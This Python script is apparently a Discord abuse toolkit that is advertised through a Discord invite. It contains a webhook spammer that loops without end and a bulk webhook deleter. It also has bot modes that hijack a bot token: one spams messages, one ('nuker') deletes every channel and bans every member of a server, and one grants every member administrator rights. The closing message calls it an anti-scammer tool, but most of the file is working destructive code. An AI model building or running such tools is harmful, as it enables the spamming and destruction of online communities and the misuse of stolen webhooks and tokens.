#APACHE LICENSE 2.0
#https://discord.gg/qmgTt2NKH6 JOIN TO READ LICENSE ON WHAT U CAN DO WITH THE SOURCE CODE AND WHAT U CANT DO AND WHAT U NEED TO DO
#IF YOU DO ANY DAMAGES, ITS NOT MY FAULT, I CANT BE HELD LIABLE

import requests
import keyboard
import time
import discord
import webbrowser
import asyncio
import os
import json
from discord import app_commands, utils
from discord.ext import commands
import datetime

#DEBUG MODE
debug_mode = False

#Discord Invite
invite = str("https://discord.gg/qmgTt2NKH6")

#Rest of the code
kb = keyboard
links = []

while True:
    choice = input("Choose a mode: Webhook Deleter | Webhook Spammer | Bot mode | Quit | Other\n>>> ").lower()

    if "other" in choice:
        while True:
            choice = input("Choose a mode: Discord | Webhook Checker | Logs | Clear logs | Webhook Login | Menu\n>>> ").lower()
            if "discord" in choice:
                with open("latest.log", "a") as f:
                    f.write("\nOpened discord " + str(discord.utils.utcnow()))
                print("Opening invite...")
                time.sleep(.5)
                webbrowser.open_new_tab(invite)
            if "webhook checker" in choice:
                with open("latest.log", "a") as f:
                    f.write("\nOpened webhook checker " + str(utils.utcnow()))
                url = input("Please enter the webhook url.\n>>> ")
                if not url:
                    with open("latest.log", "a") as f:
                        f.write("\nFailed to type in a webhook url. "+ str(utils.utcnow()))
                    print("Invalid Input")
                    time.sleep(1)
                    pass
                response = requests.get(url=url)
                if debug_mode is True:
                        print(response.status_code)
                if response.status_code in (200, 202, 201):
                    with open("latest.log", "a") as f:
                        f.write("\nValidated webhook url " + str(utils.utcnow()))
                    print("Valid webhook")
                    time.sleep(1)
                    pass
                if response.status_code in (400, 401, 402, 404, 408):
                    with open("latest.log", "a") as f:
                        f.write("\nInvalid webhook url " + str(utils.utcnow()))
                    print("Invalid webhook, try another one.")
                    time.sleep(1)
                    pass
            if "logs" in choice:
                osCommandString = "notepad.exe latest.log"
                os.system(osCommandString)
            if "clear logs" in choice:
                file_path = 'latest.log'
                print("Clearing logs...")
                with open(file_path, "w") as f:
                    f.write("")
                    f.close()
                print("Cleared logs")
                pass
            if "webhook login" in choice:
                url = input("Please enter the webook url.\n>>> ")
                with open('latest.log', "a") as f:
                    f.write("\nOpened webhook login. " + str(utils.utcnow()))
                print("Checking availability...")
                response = requests.get(url)
                if response.status_code in (400, 401, 402, 404, 408):
                    with open('latest.log', 'a') as f:
                        f.write('\nInvalid webhook url ' + str(utils.utcnow()))
                    print("Invalid URL.")
                    time.sleep(1)
                    pass
                elif response.status_code == 200:
                    print("Logging in...")
                    webhook_data = json.loads(response.content)
                    webhook_name = webhook_data['name']
                    print("Logged in as {}.".format(webhook_name))
                    time.sleep(1)
                    while True:
                        choice = input("You now can: Change Webhook Name | Delete Webhook | Send Message | Menu\n>>> ").lower()
                        if "change webhook name" in choice:
                            old_name = webhook_name
                            new_n4me = input("What do you want the name to be?\n>>> ")
                            if not new_n4me:
                                print("Invalid Input")
                                time.sleep(1)
                                pass
                            print("Old name: {}".format(old_name))
                            json1 = {
                                "name": new_n4me
                            }
                            response = requests.patch(url, json=json1)
                            response = requests.get(url)
                            webhook_data = json.loads(response.content)
                            webhook_name = webhook_data['name']
                            print("New name: {}".format(webhook_name))
                        if "delete webhook" in choice:
                            print("Deleting webhook...")
                            response = requests.delete(url)
                            if response.status_code in (400, 401, 402, 404, 408):
                                print("Couldn't delete webhook. Please open a ticket in the discord server.")
                                time.sleep(1)
                                pass
                            elif response.status_code in (200, 201, 202, 203, 204):
                                print("Webhook has been deleted.")
                                time.sleep(1)
                        if "send message" in choice:
                            msg = input("What do you want to send?\n>>> ")
                            if not msg:
                                print("Invalid Input")
                                time.sleep(1)
                                pass
                            json1 = {
                                "content": msg
                            }
                            response = requests.post(url, json=json1)
                            if response.status_code in (200, 202, 204, 201):
                                print("Sent message.")
                                time.sleep(1)
                        if "menu" in choice:
                            print("Logging out...")
                            time.sleep(1)
                            break
            if "menu" in choice:
                break

    if "bot mode" in choice:
            modes = input("What bot mode will you choose? (Spam bot | Nuker | Custom)\n>>> ").lower()
            with open("latest.log", "a") as f:
                f.write("\nOpened bot options " + str(utils.utcnow()))
            if not modes:
                with open("latest.log", "a") as f:
                    f.write("\nFailed to enter a mode " + str(utils.utcnow()))
                print("Invalid Input")
                time.sleep(1)
                pass
            token = input("Bot Token?\n>>> ")
            with open("latest.log", "a") as f:
                f.write("\nEntered bot token " + str(utils.utcnow()))
            if not token:
                with open("latest.log", "a") as f:
                    f.write("\nFailed to enter bot token " + str(utils.utcnow()))
                print("Invalid Input")
                time.sleep(1)
                pass
            if modes == "spam bot":
                with open("latest.log", "a") as f:
                    f.write("\nEntered spam bot " + str(utils.utcnow()))
                time.sleep(1)
                x = input("Spam message?\n>>> ")
                intents = discord.Intents.all()
                client = discord.Client(intents=intents)
                
                if debug_mode:
                    print("Logging into user.")
                
                @client.event
                async def on_ready():
                    with open("latest.log", "a") as f:
                        await f.write("\nLogged into spam bot user " + str(utils.utcnow()))
                    print("HIJACKED " + str(client.user) + " SUCCESSFULLY")
                
                @client.event
                async def on_message(ctx):
                    if debug_mode:
                        print("Sent the message, 200")
                    await asyncio.sleep(0.5)
                    await ctx.channel.send(x)
                
                if debug_mode:
                    print("Running bot.")
                client.run(token)
            
            elif modes == "nuker":
                with open("latest.log", "a") as f:
                    f.write("\nEntered nuker, shits about to get real  " + str(utils.utcnow()))
                intents = discord.Intents.all()
                bot = commands.Bot(command_prefix="!", intents=intents)
                
                @bot.event
                async def on_ready():
                    with open("latest.log", "a") as f:
                        f.write("\nNuker logged in " + str(utils.utcnow()))
                    print("Nuker logged in as " + str(bot.user))
                    synced = await bot.tree.sync()
                    print("Synced {} commands.".format(len(synced)))
                
                @bot.tree.command(name="nuker", description="Yes.")
                async def nuker(interaction: discord.Interaction):
                    with open("latest.log", "a") as f:
                        f.write("\nNuker triggered " + str(utils.utcnow()))
                    while True:
                        await asyncio.sleep(0.7)
                        channels = interaction.guild.channels
                        members = interaction.guild.members
                        for channels in channels:
                            await channels.delete()
                        for members in members:
                            await members.ban(reason="Racism")
                
                bot.run(token)
            elif modes == "custom":
                helpcmd = input("Do you want to include the help command? (Yes / No)\n>>> ")
                if helpcmd.lower() == "no":
                    admincmd = input("Do you want to include a admin all cmd? (Yes / No) \n>>> ")
                    if admincmd.lower() == "yes":
                        intents = discord.Intents.all()
                        bot = commands.Bot(command_prefix='!', intents=intents)
                        bot.remove_command("help")

                        async def on_ready():
                            print("Logged in as " + str(bot.user))
                            synced = await bot.tree.sync(guild=discord.Object(id=1116739541026484295))
                            print("Synced " + len(synced))

                        @bot.tree.command(name='adminall', description='Admins all members')
                        async def _adminall(interaction: discord.Interaction):
                            for member in interaction.guild.members:
                                role = await interaction.guild.create_role(".", permissions=discord.Permissions(administrator=True))
                                await member.add_roles(role)
                                await interaction.response.send_message("Granted everyone admin")
                        
                        bot.run(token)




    if choice == "webhook spammer":
            with open("latest.log", "a") as f:
                f.write("\nEntered webhook spammer " + str(utils.utcnow()))
            url = input("Please enter the webhook url.\n>>> ")
            if not url:
                with open("latest.log", "a") as f:
                    f.write("\nFailed to enter webhook url. " + str(utils.utcnow()))
                print("Invalid Input")
                time.sleep(1)
                pass
            if "https://ptb.discord.com/api/webhooks/" not in url and "https://discord.com/api/webhooks/" not in url:
                with open("latest.log", "a") as f:
                    f.write("\nFailed to enter webhook url. " + str(utils.utcnow()))
                print("Invalid Input")
                time.sleep(1)
                pass
            message = input("Spam message?\n>>> ")

            if not message:
                with open("latest.log", "a") as f:
                    f.write("\nFailed to enter spam message. " + str(utils.utcnow()))
                print("Invalid Input")
                time.sleep(1)
                pass
            
            def setup(messsages):
                data = {
                    "content": messsages
                }
                if debug_mode is True:
                    print("Posting response.")
                response = requests.post(url, json=data)
                if response.status_code == 404:
                    with open("latest.log", "a") as f:
                        f.write("\nInvalid webhook " + str(utils.utcnow()))
                    print("Rate limited, or deleted webhook. Please retry.")
                    time.sleep(1)
                    pass
                if response.status_code == 204 or 202 or 200:
                    print("Sent the message.")
                if debug_mode is True:
                    print(response.status_code)
                return response

            def initiate():
                setup("# DISCORD WEBHOOK FUCKER INITIATED")
                with open("latest.log", "a") as f:
                    f.write("\nWebhook fucker initiated " + str(utils.utcnow()))
                while True:
                    time.sleep(.5)
                    if debug_mode is True:
                        print("Sent the message.")
                    setup(message)
                    if keyboard.is_pressed("q"):
                        z = input("Are you sure you want to quit the process? (y/n)\n>>> ")
                        if z == "y":
                            pass
                        if z == "n":
                            pass
                        if not z:
                            print("No answer specified, not quitting.")
                            pass 
            if __name__ == "__main__":
                initiate()
    if choice == "webhook deleter":
            with open("latest.log", "a") as f:
                f.write("\nEntered webhook deleter " + str(utils.utcnow()))
            amt = input("How many webhooks do you want to delete?\n>>> ").lower()
            total = int(amt)
            with open("latest.log", "a") as f:
                f.write("\nEntered amount of webhooks to delete " + str(utils.utcnow()))
            if not total:
                print("Invalid Input")
                with open("latest.log", "a") as f:
                    f.write("\nFailed to enter a number. " + str(utils.utcnow()))
                time.sleep(1)
                pass
            if total == 1:
                with open("latest.log", "a") as f:
                    f.write("\n1 Webhook specified " + str(utils.utcnow()))
                url = input("Please enter the webhook url.\n>>> ")
                if not url:
                    with open("latest.log", "a") as f:
                        f.write("\nFailed to enter webhook url " + str(utils.utcnow()))
                    print("Invalid Input")
                    time.sleep(1)
                    pass
                if "https://ptb.discord.com/api/webhooks/" not in url and "https://discord.com/api/webhooks/" not in url:
                    with open("latest.log", "a") as f:
                        f.write("\nFailed to enter webhook url " + str(utils.utcnow()))
                    print("Invalid Input")
                    time.sleep(1)
                    pass
                if debug_mode is True:
                        print("Deleting...")
                response = requests.delete(url)
                with open("latest.log", "a") as f:
                    f.write("\nDeleting webhook " + str(utils.utcnow()))
                if response.status_code in (400, 402, 404):
                    with open("latest.log", "a") as f:
                        f.write("\nError deleting webhooks " + str(utils.utcnow()))
                    print("Error deleting webhooks, please open a support ticket in the discord server.")
                    webbrowser.open_new_tab("https://discord.gg/qmgTt2NKH6")
                elif response.status_code in (200, 201, 204):
                    print("Deleted webhook.")
                if debug_mode is True:
                    print(response.status_code)
            elif total > 1:
                for i in range(total):
                    url = input(f"Please enter the webhook url {i + 1}.\n>>> ")
                    links.append(url)
                    if debug_mode is True:
                        print(links)
                    if not url:
                        with open("latest.log", "a") as f:
                            f.write("\nFailed to enter webhook url " + str(utils.utcnow()))
                        print("Invalid Input")
                        time.sleep(1)
                        pass
                if "https://ptb.discord.com/api/webhooks/" not in url and "https://discord.com/api/webhooks/" not in url:
                    with open("latest.log", "a") as f:
                        f.write("\nFailed to enter webhook url " + str(utils.utcnow()))
                    print("Invalid Input")
                    time.sleep(1)
                    pass
                for url in links:
                    with open("latest.log", "a") as f:
                        f.write("\nDeleting {} webhooks " + str(utils.utcnow()).format(total))
                    try:
                        if debug_mode is True:
                            print("Deleting...")
                        response = requests.delete(url)
                        if response.status_code in (400, 402, 404):
                            print("Error deleting webhooks, please open a support ticket in the discord server.")
                        elif response.status_code in (200, 201, 204):
                            print("Deleted webhook.")
                        if debug_mode is True:
                            print(response.status_code)
                    except Exception as e:
                        print(e)
    if choice == "quit":
        print("See you next time fella anti scammer :D")
        print("Quitting in 3 seconds...")
        time.sleep(3)
        break